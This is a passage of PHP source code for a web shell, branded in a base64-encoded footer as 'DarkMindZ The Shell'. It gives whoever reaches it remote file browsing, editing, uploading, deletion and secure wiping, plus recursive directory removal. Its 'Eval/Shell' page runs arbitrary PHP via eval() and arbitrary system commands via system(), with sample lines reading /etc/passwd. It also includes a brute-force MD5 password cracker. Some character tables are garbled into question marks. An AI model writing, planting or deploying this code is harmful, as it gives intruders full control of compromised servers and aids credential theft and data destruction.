  <input name=df size=50 value=\"".realpath($d)."/\"><br>
3. <input type=checkbox name=df2 value=1 id=df2 checked>
  <label for=df2>".mm("create file name automatic")."</label>
  &nbsp;&nbsp;".mm("OR")."&nbsp;&nbsp;
  ".mm("type any file name").":
  <input name=df3 size=20><br>
4. <input type=checkbox name=df4 value=1 id=df4>
  <label for=df4>".mm("convert file name to lovercase")."</label><br>
<input type=submit value='".mm("Send File")."'>
</form>";


break;



case "tree":

$tcolors=array(
'eee','ddd','ccc','bbb','aaa','999','888','988','a88','b88','c88','d88','e88','d98',
'ca8','bb8','ac8','9d8','8e8','8d9','8ca','8bb','8ac','89d','88e');

function dir_tree($df,$level=0) {
   global $tcolors,$self;

   $df=str_replace("//","/",$df);
   $dirs=array();
   $files=array();
   if ($dir=opendir($df)) {
      while (($file=readdir($dir))!==false) {
         if ($file=="." || $file=="..") continue;
         if (is_dir("$df/$file"))  {
            $dirs[]=$file;
         }
         else {
            $files[]=$file;
         }
      }
   }
   closedir($dir);

   sort($dirs);
   sort($files);

   $i=min($level,count($tcolors)-1);
   $c=$tcolors[$i][0].$tcolors[$i][0].$tcolors[$i][1].$tcolors[$i][1].$tcolors[$i][2].$tcolors[$i][2];

   echo "\r\n\r\n\r\n
   <table width=100% border=0 cellspacing=2 cellpadding=1><tr><td bgcolor=#000000>
   <table width=100% border=0 cellspacing=0 cellpadding=1 bgcolor=#$c>
   <tr><td colspan=3 class=dir>".
   "<a href=$self?c=l&d=".urlencode($df)." class=dir><img src=$self?name=dir&c=img&1 border=0>".
   $df."</a></td></tr>";

   if (count($dirs) || count($files)) {
      echo "<tr><td width=15>&nbsp;</td><td class=all width=97%>";
      for ($i=0; $i<count($files); $i++) {
         echo $files[$i]." ";
      }
      for ($i=0; $i<count($dirs); $i++) {
         dir_tree($df."/".$dirs[$i],$level+1);
      }
      echo "</td><td width=10>&nbsp;</td></tr>";
   }
   echo '</table></td></tr></table>';
}

   echo "
   <STYLE>
   .all {
   font-family: Verdana;
   font-size: 80%;
   }
   .dir {
   font-family: Verdana;
   font-size: 95%;
   background: #666699;
   font-weight: bold;
   color: white
   }
   </STYLE>";
   echo $GLOBALS['html'];

   up($d,"","Directory");
   echo "<a href=$self?&c=l&d=".urlencode($d)."><nobr>&lt;&lt;&lt;<b>".mm("back to directory")."</b> &gt;&gt;&gt;</nobr></a>";
   echo "<p>";
   dir_tree($d);
   break;



case "delete":

   if (!$write_access) exitw();

   if (!isset($c2)) exit("err# delete 1");
   if (!isset($confirm) || strlen($confirm)<3) exit("".mm("Confirm not found (go back and set checkbox)")."");
   echo "<a href=$self?&c=l&d=".urlencode($d)."><nobr>&lt;&lt;&lt;<b>".mm("back to directory")."</b> &gt;&gt;&gt;</nobr></a><p>";
   if (!isset($d) || !isset($f) || !@file_exists($d.$f) || !@realpath($d.$f))
      exit("".mm("Delete cancel - File not found")."");
   if (realpath(getenv("SCRIPT_FILENAME"))==$d.$f && !isset($delete_remview_confirm))
      exit(mm("Are you sure you want to delete the shell???")."<br><br><br><br>
      <a href='$self?c=delete&c2=$c2&confirm=delete&d=".urlencode($d)."&f=".urlencode($f)."&delete_remview_confirm=YES'>[".mm("YES").", ".mm("DELETE")." <b>".mm("ME")."</b>]</a>
       &nbsp; &nbsp; &nbsp;
      <a href='javascript:history.back(-1)'>[".mm("NO (back)")."]</a>");

   switch ($c2) {
   case "delete":
       //exit("$d $f");
       ob();
       if (!unlink($d.$f))
          obb().exit("<font color=red><b>".mm("Delete cancel")." - ".mm("ACCESS DENIED")."</b></font>$obb");
       Header("Location: $self?c=l&d=".urlencode($d));
       echo "<P><a href=$self?c=l&d=".urlencode($d).">".mm("done (go back)")."!</a><p>";
       echo "".mm("Delete ok")."";
       break;
   case "touch":
       ob();
       if (!touch($d.$f))
          obb().exit("<font color=red><b>".mm("Touch cancel")." - ".mm("ACCESS DENIED")."</b></font>$obb");
       Header("Location: $self?c=i&d=".urlencode($d)."&f=".urlencode($f));
       echo "<a href=$self?c=i&d=".urlencode($d)."&f=".urlencode($f).">".mm("done (go back)")."!</a><p>";
       echo "".mm("Touch ok (set current time to 'modify time')")."";
       break;
   case "clean":
       ob();
       $fi=fopen($d.$f,"w+") or
          obb().exit("<font color=red><b>".mm("Clean (empty file) cancel")." - ".mm("ACCESS DENIED")."</b></font>obb");
       ftruncate($fi,0);
       fclose($fi);
       Header("Location: $self?c=i&d=".urlencode($d)."&f=".urlencode($f));
       echo "<a href=$self?c=i&d=".urlencode($d)."&f=".urlencode($f).">".mm("done (go back)")."!</a><p>";
       echo "".mm("Clean ok (file now empty)")."";
       break;
   case "wipe":
       $size=filesize($d.$f);
       ob();
       $fi=fopen($d.$f,"w+") or
          obb().exit("<font color=red><b>".mm("Wipe cancel - access denied")."</b></font>$obb");
       $str=md5("phpspbru".mt_rand(0,999999999).time());
       for ($i=0; $i<5; $i++) $str.=$str; // strlen 1024 byte
       for ($i=0; $i<intval($size/1024)+1; $i++) fwrite($fi,$str);
       fclose($fi);
       ob();
       if (!unlink($d.$f))
          obb().exit("err# delete 2 - file was rewrite, but not delete...(only write access, delete disable)$obb");
       Header("Location: $self?c=l&d=".urlencode($d));
       echo "<a href=$self?c=i&d=".urlencode($d).">".mm("done (go back)")."!</a><p>";
       echo "".mm("Wipe ok (file deleted)")."";
       break;
   }


   break;


case "dirdelete":

   if (!$write_access) exitw();

function dir_delete($df) {
   echo "<b>".basename($df)."</b><ul>";
   if ($dir=opendir($df)) {
      $i=0;
      while (($file=readdir($dir))!==false) {
         if ($file=="." || $file=="..") continue;
         if (is_dir("$df/$file"))  {
            dir_delete($df."/".$file);
         }
         else {
            echo "$file<br>";
            echo "".mm("DELETE")." <tt>$df/$file</tt> ...<br>";
            unlink($df."/".$file);
         }
         $i++;
      }
      //if ($i==0) echo "-empty-<br>";
   }
   closedir($dir);
   echo "</ul>";
   echo "".mm("DELETE")." ".mm("DIR")." <tt>$df</tt> ...<br>";
   rmdir("$df/$file");
}

   if (!isset($c2)) exit("error dirdelete 1");
   if (!isset($confirm)) exit("".mm("Confirm not found (go back and set checkbox)")."!");
   $df="$d";

   switch ($c2) {

      case "files":
         echo "<h3>".mm("Deleting all files in")." <tt>$df</tt> ...</h3>";
         if ($dir=opendir($df)) {
            while (($file=readdir($dir))!==false) {
                if ($file=="." || $file=="..") continue;
                if (is_dir($df.$file))  {
                   echo "<big><tt><b>>$file</b></tt></big> ".mm("skip").": ".filetype($df.$file)."<br>";
                }
                elseif (is_file($df.$file)) {
                   echo "<big><tt><b><font color=red>$file</font></b></tt></big> ".mm("deleting")."...";
                   unlink($df.$file);
                   echo "<br>";
                }
                else {
                   echo "<big><tt><b>$file</b></tt></big> ".mm("skip").": ".filetype($df.$file)."<br>";
                }
            }
         }
         closedir($dir);
         $ref="$self?c=l&d=".urlencode($d);
         break;

      case "dir":
         echo "<h3>".mm("Deleting all dir/files (recursive) in")." <tt>$df</tt> ...</h3>";
         dir_delete($df);
         $ref="$self?c=l&d=".urlencode(realpath($d."/.."));
         break;
   }
   //header("Location: $ref");
   echo "<p><a href=$ref>".mm("DONE, go back")."</a>";
   break;

case "copy":

   if (!$write_access) exitw();

   if (!isset($from) || !@file_exists($from) || !@realpath($from))
      exit("err# copy 1, file [$from] not found");
   if (!isset($to) || strlen($to)==0)
      exit("err# copy 2, file [$to] not found");
   echo "Copy: ....<hr size=1 noshade>";
   if (!copy($from,$to)) {
      echo "<hr size=1 noshade><font color=red><b>Error!</b></font><p>";
      echo "View <a href=$self?c=l&d=".urlencode(dirname($from)).">".dirname($from)."<p>";
   }
   else
      echo "".mm("DONE")."!<p>";
      echo "View <a href=$self?c=l&d=".urlencode(dirname($from)).">".dirname($from)."</a> (dir 'from')<p>";
      echo "View <a href=$self?c=l&d=".urlencode(dirname($to)).">".dirname($to)."</a> (dir 'to')<p>";
   break;




case "e": // edit

   if (!$write_access) exitw();

   if (!@realpath($d.$f) || !file_exists($d.$f)) exit("".mm("file not found")."");
   echo $GLOBALS['html'];
   up($d,$f);
   echo "<a href=$self?&c=l&d=".urlencode($d)."><nobr>&lt;&lt;&lt;<b>".mm("back to directory")."</b> &gt;&gt;&gt;</nobr></a>";
   up_link($d,$f);
   $msg="";
   if (!is_file($d.$f) || !$fi=@fopen($d.$f,"r+")) $msg=" (<font color=red><b>".mm("ONLY READ ACCESS (don't edit!)")."</b></font>)";
   else fclose($fi);
   if (!is_file($d.$f) || !$fi=@fopen($d.$f,"r")) $msg=" (<font color=red><b>".mm("Can't READ file - access denied (don't edit!)")."</b></font>)";
   else fclose($fi);
   if ($msg=="") $msg="(<font color=#009900><b>".mm("full read/write access")."</b></font>)";
   echo "<p><b>".mm("EDIT FILE")."</b> $msg<p>";

   if (!$fi=@fopen($d.$f,"rb")) exit("".mm("can't open, access denied")."");
   echo "<form action=$self method=post>
   <input type=hidden name=c value=e_submit>
   <input type=hidden name=d value=\"".htmlspecialchars($d)."\">
   <input type=hidden name=f value=\"".htmlspecialchars($f)."\">
   <textarea name=text cols=70 rows=20 style='width: 100%;'>".
   htmlspecialchars(fread($fi,filesize($d.$f)))."</textarea><p>
   <input type=submit value=' ".mm("SAVE FILE (write to disk)")." '>
   <input type=checkbox name=confirm value=1 id=conf>
   <label for=conf><font color=red><b><= confirm</b></font></label>
   </form>";

   break;


case "e_submit":

   if (!$write_access) exitw();

   if (!realpath($d.$f) || !file_exists($d.$f)) exit("file not found");
   if (!isset($text)) exit("err# e_submit 1");
   if (!isset($confirm)) exit("Confirm not found (go back and set checkbox)");
   if (!$fi=@fopen($d.$f,"w+")) exit("access denied");
   fwrite($fi,$text);
   fclose($fi);
   Header("Location: $self?c=i&d=".urlencode($d)."&f=".urlencode($f));
   echo "<a href=$self?c=i&d=".urlencode($d)."&f=".urlencode($f).">SAVE DONE (go back)!</a>";

   break;



case "newfile_submit":

   if (!$write_access) exitw();

   if (!isset($text) || !isset($df)) exit("err# newfile_submit 1");
   if (!isset($confirm)) exit("Confirm not found (go back and set checkbox)");
   if (!$fi=@fopen($df,"w+")) exit("access denied, can't create/open [$df]");
   fwrite($fi,$text);
   fclose($fi);
   Header("Location: $self?c=l&d=".urlencode(dirname($df)));
   echo "<a href=$self?c=i&d=".urlencode(dirname($df)).">SAVE NEW FILE DONE (go back)!</a>";
   break;


case "fileupload_submit":

   if (!$write_access) exitw();
   if (!isset($df)) exit("err# newfile_submit 1");
   if (!isset($df3)) exit("err# newfile_submit 2");

   $fname="";
   if (isset($df2)) {
      if (!preg_match("~([^/]+)$~",$HTTP_POST_FILES['userfile']['name'],$ok)) {
         exit("Upload failed: can't detect file name");
      }
      $fname=$ok[1];
   }
   else {
      $fname=$df3;
   }
   if ($fname=="")
     exit("".mm("You mast checked 'create file name automatic' OR typed file name!")."");
   if (isset($df4)) $fname=strtolower($fname);

   echo "Temp file: ".$HTTP_POST_FILES['userfile']['tmp_name']."<br>";
   echo "Origin file name: ".$HTTP_POST_FILES['userfile']['name']."<br>";
   echo "File size: ".$HTTP_POST_FILES['userfile']['size']."<br>";
   if ($df[strlen($df)-1]!="/") $df.="/";
   echo "".mm("SAVING TO").": <font color=blue>$df</font><font color=red><b>$fname</b></font><p>";

   ob();
   $ok=copy($HTTP_POST_FILES['userfile']['tmp_name'],"$df$fname");
   obb();
   if (!$ok) exit("<font color=red><b>".mm("Sorry, access denied")."</b></font> $obb");

   if (!isset($ref)) $ref="$self?c=l&d=".urlencode($df);
   Header("Location: $ref");
   echo "<a href='$ref'>NEW FILE SAVED</a>";

   break;


case "newdir_submit":

   if (!$write_access) exitw();
   if (!isset($df)) exit("err# newdir_submit 1");
   ob();
   if (!mkdir($df,$mkdir_mode)) {
      obb();
      exit("Access denied $obb");
   }
   obb();
   if (!isset($ref)) $ref="$self?c=l&d=".urlencode($df);
   Header("Location: $ref");
   echo "<a href='$ref'>Go to new directory!</a>";

   break;


case "t":

   echo "
   <a href='$self'>START PAGE</a> |
   <a href='$self?c=t'>Eval/Shell</a> |
   <a href='$self?c=codes'>Character map</a><br>
   ";


   if (!$write_access) exitw();
   error_reporting(2038);

   if (!isset($php)) {
      $php="/* line 1 */\n\n// ".mm("for example, uncomment next line").":\nphpinfo();\n\n//readfile(\"/etc/passwd\");\n\n/* line 8 */";
      $skipphp=1;
      $pre='checked';
      $nlbr='';
      $xmp='';
      $htmls='checked';
   }

   echo "<b>".mm("Eval PHP code")."</b> (".mm("don't type")." \"&lt;?\" ".mm("and")." \"?&gt;\")
<form action=$self method=post>
<input type=hidden name=c value=t>
<textarea name= rows=".(!isset($skipphp)?10:4)." cols=60 style='width:100%;'>$php</textarea>
<br>
<input type=checkbox name=pre value='checked' $pre id='pre'>
   <label for='pre'> add &lt;pre&gt;</label> &nbsp;
<input type=checkbox name=xmp value='checked' $xmp id='xmp'>
   <label for='xmp'> add &lt;xmp&gt;</label> &nbsp;
<input type=checkbox name=htmls value='checked' $htmls id='htmls'>
   <label for='htmls'> add htmlspecialchars()</label> &nbsp;
<input type=checkbox name=nlbr value='checked' $nlbr id='nlbr'>
   <label for='nlbr'> add nl2br()</label><br>
<input type=submit></form>
<P>";

   if (!isset($shell)) $skipshell=1;

   if (!isset($skipphp)) {
      echo "<hr size=1 noshade>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
      if ($pre<>'') echo "<pre>";
      if ($xmp<>'') echo "<xmp>";
      if ($nlbr<>'' || $htmls<>'') {
         ob_start();
      }
      if ($phpeval_access) eval($php);
      else die("Sorry, function eval() disabled.");
      if ($nlbr<>'' || $htmls<>'') {
         $tmp=ob_get_contents();
         ob_end_clean();
         if ($htmls<>'') $tmp=htmlspecialchars($tmp);
         if ($nlbr<>'') $tmp=nl2br($tmp);
         echo $tmp;
      }
      if ($xmp<>'') echo "</xmp>";
      if ($pre<>'') echo "</pre>";
      echo "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
      echo "</table></table></table></table></table></table></table></table></table></center></table><hr size=1 noshade>";
   }

   if (!isset($shell)) {
      $shell="#".mm("example (remove comments '#')").": \n\n#cat /etc/passwd;\n\n#ps -ax\n\n#uname -a";
      $skipshell=1;
   }
   echo "<P><b>".mm("Shell commands")."</b>
<form action=$self method=post>
<input type=hidden name=c value=t>
<textarea name=shell rows=".(!isset($skipshell)?10:4)." cols=60 style='width:100%;'>$shell</textarea><br>
<input type=submit></form>
<P>";
   if (!isset($skipshell)) {
      echo "<hr size=1 noshade>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<xmp>";
      if ($system_access) system($shell);
      else die("Sorry, function system() disabled.");
      echo "</xmp>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n
      </table></table></table></table></table></table></table></table></table></center><hr size=1 noshade>";
   }


  $ttype=
  array(1=>"MD5",
  2=>"Base64",
  3=>"Base64 + chunk",
  4=>"Base64 + chunk + quotes",
  5=>"Decode Base64<br>",
  6=>"UnixTime=>Date(".time().")",
  7=>"Decode MD5 (password crack)<br>",
  8=>"MKtime: YYYY MM DD [hh [mm [ss]]]<br>",
  10=>"cp1251=&gt;koi8r",
  11=>"koi8r=&gt;cp1251",
  12=>"cp1251=&gt;mac",
  13=>"mac=&gt;cp1251",
  15=>"koi8r=&gt;mac",
  16=>"mac=&gt;koi8r",
  );
  echo "<P><b>".mm("Universal convert")."</b>";

  echo "<a name=convert></a><form action='$self#convert' method=post>";
  foreach ($ttype as $k=>$v)
     echo "&nbsp;&nbsp;<nobr><br><input ".($k==$name?"checked":"")." type=radio name=name value=$k id=x$k><br><label for=x$k>$v</label></nobr> ";

  echo "
<input type=hidden name=c value=t>
<p>
<br>
<textarea name=convert rows=".(isset($convert)?10:3)." cols=60 style='width:70%;'>".htmlspecialchars($convert)."</textarea><br>
<input type=submit><br>";


   $russtr1="JCUKENGZH_FYVAPROLDESMIT_Bjcukengzh_fyvaproldesmit_b";
   $russtr2="E??E???C??OUAAI?IE????E?U?й??к???з??фывап?ол????и?ь?";
   function from_translit($ss) {
      global $russtr1,$russtr2;
      $w=array("Sch",'?',"SCH",'?',"ScH",'?',"SCh",'?',"sch",'?',"Jo",'?',"JO",'?',"jo",'?',
      "Zh",'?',"ZH",'?',"zh",'?',"Ch",'?',"CH",'?',"ch",'?',"Sh",'?',"SH",'?',"sh",'?',
      "##",'?',"''",'?',"Eh",'?',"EH",'?',"eh",'?',"Ju",'?',"JU",'?',"ju",'?',"Yu",'?',
      "YU",'?',"yu",'?',"YA","?","Ya","?","ya","?","Ja",'?',"JA",'?',"ja",'?');
      $c=count($w);
      for ($i=0; $i<$c; $i+=2) $ss=str_replace($w[$i],$w[$i+1],$ss);
      $ss=strtr($ss,$russtr1,$russtr2);
      $ss=preg_replace("!([?-?]+)~([?-?]+)!is","\\1\\2",$ss);
      return $ss;
   }
   function to_translit($ss) {
      global $russtr1,$russtr2;
      $ss=strtr($ss,$russtr2,$russtr1);
      $ss=str_replace(
         array('?', '?',  '?', '?', '?', '?', '?', '?', '?',  '?', '?', '?', '?', '?', ),
         array('SH','SCH','ZH','YA','CH','YU','YO','sh','sch','zh','ya','ch','yu','yo',),
         $ss);
      return $ss;
   }

   if (isset($convert)) {
      if (!isset($name)) $name="0";
      $out="";
      switch ($name) {

         case 1:
            $out=md5($convert);
            break;

         case 2:
            $out=base64_encode($convert);
            break;

         case 3:
            $out=chunk_split(base64_encode($convert));
            break;

         case 4:
            $out=base64_encode($convert);
            $out=substr(preg_replace("!.{1,76}!","'\\0'.\n",$out),0,-2);
            break;

         case 5:
            $out=base64_decode($convert);
            break;

         case 6:
            $convert=intval($convert);
            if ($convert==0) $convert=time();
            $out="Unixtime=$convert\n---Day/Month/Year--\n".
               date("d/m/Y H:i:s",$convert)."\n".
               date("d-m-Y H:i:s",$convert)."\n".
               date("d.m.Y H:i:s",$convert)."\n".
             "---Month/Day/Year--\n".
               date("m/d/Y H:i:s",$convert)."\n".
               date("m-d-Y H:i:s",$convert)."\n".
               date("m.d.Y H:i:s",$convert)."\n".
             "---------SQL-------\n".
               date("Y-m-d H:i:s",$convert)."\n".
               date("Y m d H i s",$convert)."\n".
               date("YmdHis",$convert);
            break;

         case 8:
            $c=explode(" ",trim(preg_replace("! +!"," ",$convert)));
            if (count($c)<3 || count($c)>6) $out="Bad value. Type: 2000 12 31 or 2000 12 31 12 59 59";
            else {
               if (empty($c[0])) $c[0]=1970;
               if ($c[0]<50) $c[0]=2000+$c[0];
               if ($c[0]>50 && $c[0]<100) $c[0]=1900+$c[0];
               if (empty($c[1])) $c[1]=1;
               if (empty($c[2])) $c[2]=1;
               if (empty($c[3])) $c[3]=0;
               if (empty($c[4])) $c[4]=0;
               if (empty($c[5])) $c[5]=0;
               $out="TIME: $c[0]-$c[1]-$c[2] $c[3]:$c[4]:$c[5]\nMKTIME: ".mktime($c[3],$c[4],$c[5],$c[1],$c[2],$c[0]);
            }
            break;

         case 9:
            $out=from_translit($convert);
            break;

         case 14:
            $out=to_translit($convert);
            break;

         case 10: $out=convert_cyr_string($convert,'w','k'); break;
         case 11: $out=convert_cyr_string($convert,'k','w'); break;
         case 12: $out=convert_cyr_string($convert,'w','m'); break;
         case 13: $out=convert_cyr_string($convert,'m','w'); break;
         case 15: $out=convert_cyr_string($convert,'k','m'); break;
         case 16: $out=convert_cyr_string($convert,'m','k'); break;

         case 7:
            echo "<script>top.location.href='$self?c=md5crack&text=$convert'</script>";
            break;

         case 0:
            $out="Please select anythink function in list. Example: type 'test' and select 'md5'. Then click 'Submit'.";
            break;

         default:
            $out='Sorry, this function not work (try new versions)';
      }
      echo "<P><hr size=1 noshade>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<pre><xmp>$out</xmp></pre>\n\n\n\n\n\n\n\n\n<hr size=1 noshade>";
   }

   break;


case "md5crack":

   echo "<form action=$self name=main><input type=hidden name=c value=md5crack>
   <h2>Decode MD5 (<a href=$self>home</a>|<a href=$self?c=t&name=1#convert>md5</a>)</h2><P>";

   if (!isset($go)) {
      if (!isset($fullqty)) $fullqty="";
      if (!isset($fulltime)) $fulltime="";
      if (!isset($php)) $php="";
      if (!isset($from)) $from="";
      echo "<b>STRING</b>: <input type=text name=text value='$text' size=40> (only 32 char: 0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f)";
      echo "<P><b>Range</b>: <input type=text name=php value=\"".htmlspecialchars($php)."\" size=90><br>";
      $chars=array(
      'a-z'=>"abcdefghijklmnopqrstuvwxyz",
      'a-z,A-Z'=>"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
      'a-z,0-9'=>"abcdefghijklmnopqrstuvwxyz0123456789",
      'a-z,A-Z,0-9'=>"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
      'a-z,A-Z,0-9,other'=>"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~`!@#\$%^&*()_+-=[]{};:,<.>/\"'\\");
      $i=0;
      foreach ($chars as $k=>$v) {
         echo "<script>str$i=\"".str_replace("\"","\\\"",str_replace("\\","\\\\",$v))."\"</script>
         <a href='' onclick=\"document.main.php.value=str$i;return false\">$k</a> &nbsp; ";
         $i++;
      }
      echo "<P>
      <b>Start from</b>: <input type=text size=70 name=from value='$from'><P>
      <input type=hidden name=go value=1>
      <input type=hidden name=fullqty value=$fullqty>
      <input type=hidden name=fulltime value=$fulltime>
      <input type=submit value='Start!'><form>";
   }
   else {

      function mdgetword() {
         global $php,$from,$word;
         $word="";
         for ($i=0; $i<count($from); $i++) $word.=$php[$from[$i]];
      }

      $fulltime=@intval($fulltime);
      $fullqty=@intval($fullqty);

      $text=strtolower($text);
      if (!preg_match("!^[0-9a-f]{32}$!",$text)) exit("md5 bad format: must be 32 bytes, range 0-9,a,b,c,d,e,f");
      if (!isset($php) || strlen($php)==0) $php="qwertyuiopasdfghjklzxcvbnm";
      if (!isset($from) || !preg_match("!^([0-9]+):(([0-9]+,)*[0-9]+)$!",$from,$ok)) {
         $pos=0;
         $from=0;
      }
      else {
         $pos=$ok[1];
         $from=$ok[2];
      }
      $from=explode(",",$from);
      if (!is_array($from) || !count($from) || count($from)==1 && $from[0]==0) {
         $from=array(0);
         if (md5("")===$text) exit("** DONE **<br><br>md5('')=$text<br><br>(try empty string, 0 bytes!)");
      }
      $phplen=strlen($php);
      mdgetword();
      $poslen=strlen($word);
      if ($pos<0 || $pos>=$poslen) $pos=0;

      for ($i=0; $i<10; $i++) { echo "<!-- -->\r\n"; flush(); }

      echo "<h3><a href='$self?c=md5crack".
         "&from=".urlencode("$pos:".implode(",",$from)).
         "&text=".urlencode($text).
         "&php=".urlencode($php).
         "&fulltime=$fulltime&fullqty=$fullqty".
         "'>Save this link</a> - click for break and save current position</h3>";
      flush();

      echo "
      MD5_HASH=$text<br>
      CURRENT_WORD=$word<br>
      CURRENT_DIGIT=$pos:".implode(",",$from)."<br>
      RANGE=".htmlspecialchars($php)."<br>
      ProcessTime=$fulltime sec (".(floor($fulltime/60/60))."h)<br>
      Calculation(qty)={$fullqty}0000<p><font face=courier>";
      flush();


      $fullsum=pow($phplen,$poslen);
      $time1=time();
      $i=0;

      while (1) {

         $i++;
         if ($i>50000) {
            $time=time()-$time1;
            if ($time>20) break;
            $i=0;
            $sum=0;
            for ($j=1; $j<count($from); $j++) $sum+=$from[$j]*pow($phplen,$j);
            printf("<nobr><b>%02.2f%%</b> ($word) %02dsec |</nobr> \r\n",
               $sum*100/$fullsum,$time);
            flush();
            $fullqty+=5;
         }

         if (md5($word)===$text)
            exit("<P><font color=red size=+1><b>** DONE **<P><tt>[$word]=[$text]</tt></b></font>
            <script> window.focus();  window.focus(); setTimeout(\"alert('Done!')\",100);</script>");
         $from[$pos]++;
         if ($from[$pos]==$phplen) {
            $flag=1;
            $from[$pos]=0;
            $word[$pos]=$php[0];
            for ($pos=$pos+1; $pos<$poslen; $pos++) {
               if ($from[$pos]+1<$phplen) {
                  $from[$pos]++;
                  $word[$pos]=$php[$from[$pos]];
                  $flag=0;
                  $pos=0;
                  break;
               }
               else {
                  $from[$pos]=0;
                  $word[$pos]=$php[0];
               }
            }
            if ($flag) {
               $from[]=0;
               $poslen=count($from);
               $word.=$php[0];
               $pos=0;
               $fullsum=pow($phplen,$poslen);
            }
         }
         $word[$pos]=$php[$from[$pos]];
      }

      $fulltime+=time()-$time1;
      if ($i>5000) $fullqty++;
      $url="$self?c=md5crack".
           "&from=".urlencode("$pos:".implode(",",$from)).
           "&text=".urlencode($text).
           "&php=".urlencode($php).
           "&fulltime=$fulltime&fullqty=$fullqty&go=1";
      echo "<script>location.href=\"$url\"</script><a href='$url'>click here</a>";

   }

   break;


case "codes":

   error_reporting(2039);
   if (!isset($limit)) $limit=999;
   if (!isset($fontsize)) $fontsize="300%";

   echo "<h3>
   <a href='$self'>START PAGE</a> |
   <a href='$self?c=t'>Eval/Shell</a> |
   <a href='$self?c=codes'>Character map</a>
   </h3>";

   echo "<h3>".mm("Character map (symbol codes table)")."</h3>
   <form action=$self method=get>
   <input type=hidden name=c value=\"codes\">
   <select name=fontname size=1>
   <option value='Webdings'>====[ ".mm("Select font")." ]====";

   foreach (array('Arial','Courier','Comic Sans MS','Fixedsys','Small fonts','Symbol',
      'System','Tahoma','Terminal','Times New Roman','Verdana',
      'Webdings','Wingdings','Wingdings 2','Wingdings 3') as $v)
      echo "<option".($fontname==$v?" selected":"").">$v";

   echo "</select>
   ".mm("or type other")."
   <input size=13 type=text name=fontname2 value=\"$fontname2\">.
   ".mm("Font size").": <input size=6 type=text name=fontsize value=\"$fontsize\">.<br>
   ".mm("Code limit").":
   <input type=radio name=limit value=255 id=a1 ".($limit==255?"checked":"")."><label for=a1>0-255</label>
   <input type=radio name=limit value=999 id=a2 ".($limit==999?"checked":"")."><label for=a2>0-999 </label>
   <input type=radio name=limit value=9999 id=a3 ".($limit==9999?"checked":"")."><label for=a3>0-9999</label>
   <input type=submit value='".mm("Generate table")." !'></form><P>";

   if (!isset($fontname)) break;
   if (!empty($fontname2)) $fontname=$fontname2;
   echo "
   <STYLE>
   .codes { font: $fontsize $fontname; text-align: center; }
   .z { font: 12pt Fixedsys; color: #cccccc; }
   </STYLE>
   <table class=codes border=0 cellspacing=0 cellpadding=1>";
	?>
          <SCRIPT>
   m=8;
   n=1;
   s=new String("");
   s=s+"<tr><td class=z>&amp;#0000;</td><td>&nbsp;</td>";
   for (i=1; i<=<?php echo $limit; ?>; i++) {
      if (i<10) x="000"+i;
      else if (i<100) x="00"+i;
           else if (i<1000) x="0"+i;
                else x=i;
      if (n%m==0) s=s+"<tr>";
      s=s+"<td class=z>&amp;#"+x+";</td>";
      s=s+"<td>&#"+x+";</td>";
      if (n%m+1==m) s=s+"</tr>";
      if (s.length>500) {
         document.write(s);
         s=""
      }
      n++;
   }
   document.write(s);
   </SCRIPT> 
	<?php

   echo "</table>";
   break;
  exit;
}
	?>
        </td>
      </tr>
    </table>
  </td>
  <td width="72%">
    <hr align="center" width="75%"> <div align="center"><?php echo base64_decode("fHwgLS09WyANCiAgICAgIERhcmtNaW5kWiBUaGUgU2hlbGwgfHwgQnkgPGEgaHJlZj1cJ21haWw6cm9tZW8uaGF4eG9yQGdtYWlsLmNvbVwnPlJvTWVPPC9hPiANCiAgICAgIF09LS0gfHw") ?></div>
    <hr align="center" width="75%">
    <div align="center"><font size="-2"><?php echo base64_decode("Q29weXJpZ2h0IA0KICAgICAgUmVzZXJ2ZWQgJmNvcHk7IFJvTWVPIHx8IERhcmtNaW5kWi5jb20") ?>
	</font>
	</div>
	 </td>
